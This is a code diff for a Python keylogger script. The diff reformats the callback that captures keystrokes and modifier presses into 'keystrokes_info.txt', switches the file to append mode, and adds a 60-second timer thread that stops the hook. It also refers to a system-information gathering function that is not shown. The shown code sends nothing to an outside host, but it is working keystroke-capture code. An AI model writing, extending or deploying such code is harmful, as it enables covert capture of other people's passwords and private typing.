@@ -60,41 +60,59 @@ MAP = {
 }
 
 TERMINATE_KEY = "f7"
+TIMER_DURATION = 60  # Time in seconds (e.g., 60 seconds)
 
 def callback(output, is_down, event):
-  if event.event_type in ("up", "down"):
-    key = MAP.get(event.name, event.name)
-    modifier = len(key) > 1
-    if not modifier and event.event_type == "down": # Capture only modifiers when keys are pressed
-      return
-    if modifier: # Avoid typing the same key multiple times if it is being pressed
-      if event.event_type == "down":
-        if is_down.get(key, False):
-          return
-        is_down[key] = True
-      elif event.event_type == "up":
-        is_down[key] = False
-      key = " [{} ({})] ".format(key, event.event_type) # Indicate if the key is being pressed
-    elif key == "\r":
-      key = "\n" # Line break
-    output.write(key) # Write the key to the output file
-    output.flush() # Force write
+    if event.event_type in ("up", "down"):
+        key = MAP.get(event.name, event.name)
+        modifier = len(key) > 1
+        if not modifier and event.event_type == "down":  # Capture only modifiers when keys are pressed
+            return
+        if modifier:  # Avoid typing the same key multiple times if it is being pressed
+            if event.event_type == "down":
+                if is_down.get(key, False):
+                    return
+                is_down[key] = True
+            elif event.event_type == "up":
+                is_down[key] = False
+            key = " [{} ({})] ".format(key, event.event_type)  # Indicate if the key is being pressed
+        elif key == "\r":
+            key = "\n"  # Line break
+        output.write(key)  # Write the key to the output file
+        output.flush()  # Force write
 
 def onexit(output):
-  output.close()
+    output.close()
+
+def timer_termination():
+    print(f"Keylogger will stop in {TIMER_DURATION} seconds...")
+    time.sleep(TIMER_DURATION)
+    print("Timer expired. Stopping keylogger.")
+    keyboard.unhook_all()  # Unhook all keyboard events to stop the keylogger
 
 def key_logger():
-    print('starting system information')
-    
-    print("Press F7 to terminate")
+    print('Starting system information...')
+    print("Press F7 to terminate or wait for the timer to expire.")
     try:
-        is_down = {} # Indicates if a key is being pressed
-        output = open(keystrokes_info, '+x') # Output file
-        atexit.register(onexit, output) # Close the file at the end of the program
-        keyboard.hook(partial(callback, output, is_down)) # Install the keylogger
-        keyboard.wait(TERMINATE_KEY) # Run until end key is pressed
+        is_down = {}  # Indicates if a key is being pressed
+        output = open('keystrokes_info.txt', 'a')  # Output file
+        atexit.register(onexit, output)  # Close the file at the end of the program
+
+        # Start the keylogger hook
+        keyboard.hook(partial(callback, output, is_down))
+        
+        # Start the timer in a separate thread
+        timer_thread = threading.Thread(target=timer_termination)
+        timer_thread.daemon = True  # Ensure thread terminates when main thread exits
+        timer_thread.start()
+        
+        # Wait for the terminate key (F7) to be pressed
+        keyboard.wait(TERMINATE_KEY)
+        print("Terminate key pressed. Stopping keylogger.")
+        keyboard.unhook_all()  # Unhook all keyboard events to stop the keylogger
+        
     except PermissionError:
-        print("File is probably being used by another process")
+        print("File is probably being used by another process.")
 
 # Get System Information
 def system_information():
